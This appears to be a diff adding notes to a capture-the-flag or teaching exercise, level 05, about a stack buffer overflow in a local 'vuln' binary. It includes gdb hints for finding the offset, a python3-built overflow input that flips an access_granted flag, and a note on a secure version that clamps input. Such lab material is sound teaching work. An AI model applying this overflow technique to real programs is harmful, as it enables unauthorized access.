@@ -1,0 +1,12 @@
+# Normal input
+./vuln "Bhushan" -> Buffer: Bhushan / access_granted is still 0.
+
+# Win: input long enough to overwrite access_granted with a nonzero value
+# (exact length/content depends on compiler's stack layout -- find it with
+# gdb: `print &buffer` and `print &access_granted` to get the offset, then
+# craft an input of that length with nonzero bytes past position 16)
+./vuln "$(python3 -c "print('A'*16 + 'B'*4)")"
+-> FLAG: access_granted flipped -- level 05 solved
+   (may also show ASan WRITE depending on exact overflow distance)
+
+# secure.c -> input clamped to 15 bytes, access_granted always stays 0
